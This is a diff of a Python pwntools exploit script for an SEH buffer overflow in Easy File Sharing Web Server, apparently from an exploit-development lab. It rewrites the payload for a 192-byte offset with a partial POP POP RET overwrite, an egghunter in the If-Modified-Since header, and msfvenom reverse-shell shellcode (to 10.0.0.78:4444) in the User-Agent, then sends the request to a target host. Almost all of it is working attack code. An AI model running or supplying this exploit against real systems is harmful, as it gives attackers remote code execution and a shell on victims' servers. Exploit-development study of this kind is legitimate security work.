@@ -6,9 +6,9 @@ from pwn import *
 victim_host = "10.0.0.213"
 victim_port = 80
 
-# SEH handler overwritten - 46356646
-# [*] Exact match at offset 4065
-# 0x1001ab99 : POP POP RET from ImageLoad.dll
+# SEH handler overwritten - 41346741
+# [*] Exact match at offset 192
+# 0x0044D9C4 : POP POP RET - Has nullbyte so partial overwrite
 
 # msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.78 LPORT=4444 -f python -a x86 -b '\x00\x0a\x0c\x0d' -v shellcode -f python 
 
@@ -44,39 +44,39 @@ shellcode += "\x18\x62\x43\xb3\x60\xee\x74\x6e\xa6\x17\xf7\x9a"
 shellcode += "\x57\xec\xe7\xef\x52\xa8\xaf\x1c\x2f\xa1\x45\x22"
 shellcode += "\x9c\xc2\x4f"
 
-seh = "\x99\xab\x01\x10"  # POP POP RET
-nseh = "\xeb\x06\x90\x90" # Short JMP forward 6 bytes
+seh = "\xC4\xD9\x44" # partial pop pop ret overwrite
+nseh = "\xEB\xC4\x90\x90"
 
 egghunter  = "\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74"
 egghunter += "\xef\xb8\x77\x30\x30\x74\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"
 # !mona egg -t w00t - 32 bytes
 
-exploit_payload  = "A" * 4061
+exploit_payload  = "A" * (188 - 32)
+exploit_payload += egghunter
+exploit_payload += "A" * (300-len(exploit_payload))
 exploit_payload += nseh
 exploit_payload += seh
-exploit_payload += egghunter
-exploit_payload += "\x90" * 7
-exploit_payload += "D" * (5000 - 32 - len (exploit_payload))
 
-payload  = "GET "
-payload += exploit_payload
-payload += "User-Agent: w00tw00t" + shellcode + "\r\n"
-payload += " HTTP/1.1\r\n"
+http_request  = "GET / HTTP/1.1\r\n"
+http_request += "Host: \r\n"
+http_request += "User-Agent: " + "w00tw00t" + "\x90" * 16 + shellcode + "\r\n"
+http_request += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
+http_request += "Accept-Language: en-US,en;q=0.5\r\n"
+http_request += "Accept-Encoding: gzip, deflate\r\n"
+http_request += "Connection: close\r\n"
+http_request += "Upgrade-Insecure-Requests: 1\r\n"
+http_request += "If-Modified-Since: Wed, " + exploit_payload + "\r\n\r\n"
 
-try:
-    expl = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
-    expl.connect((victim_host, victim_port))
-    expl.send(payload)
+expl = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
+expl.connect((victim_host, victim_port))
 
-    log.info("Easy File Sharing Web Server SEH overwrite")
-    log.info("Sending payload to victim...")
-    log.info("Sending NSEH with short JMP")
-    log.info("Sending SEH with POP POP RET")
-    log.info("Sending egghunter, w00tw00t")
-    log.info("Watch NC for a shell on 4444\n")
+expl.send(http_request)
 
-    print("[!] You may need to send it mutiple times")
-    expl.close()
+log.info("[!] You may need to send it mutiple times")
+log.info("Sending malicious HTTP GET request")
+log.info("Sending filled buffed (188 bytes)")
+log.info("Sending egghunter (32 bytes)")
+log.info("Sending NSEH with backwards JMP (up 80 bytes)")
+log.info("Sending SEH with POP POP RET (partial overwrite) ")
 
-except:
-    print("[!] Error connecting to the victim")
+expl.close()
